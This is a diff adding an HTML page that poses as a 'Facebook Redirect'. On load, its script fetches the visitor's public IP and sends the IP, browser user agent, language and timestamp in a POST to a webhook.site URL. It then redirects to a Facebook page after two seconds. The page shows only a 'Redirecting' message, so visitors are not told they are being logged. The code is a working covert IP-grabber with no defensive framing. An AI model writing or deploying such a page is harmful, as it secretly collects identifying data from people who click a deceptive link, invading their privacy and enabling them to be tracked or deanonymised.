@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook Redirect</title>
+  <script>
+    window.onload = () => {
+      const ipLog = async () => {
+        try {
+          const res = await fetch("https://api.ipify.org?format=json");
+          const data = await res.json();
+          const ip = data.ip;
+
+          const info = {
+            ip: ip,
+            userAgent: navigator.userAgent,
+            lang: navigator.language,
+            time: new Date().toISOString()
+          };
+
+          // Send to your webhook
+          fetch("https://webhook.site/your-unique-url", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(info)
+          });
+
+        } catch (err) {
+          console.error(err);
+        }
+      };
+
+      ipLog();
+
+      // Optional: auto-redirect after logging
+      setTimeout(() => {
+        window.location.href = "https://facebook.com/your-page-name";
+      }, 2000);
+    };
+  </script>
+</head>
+<body>
+  <h2>Redirecting to Facebook...</h2>
+</body>
+</html>
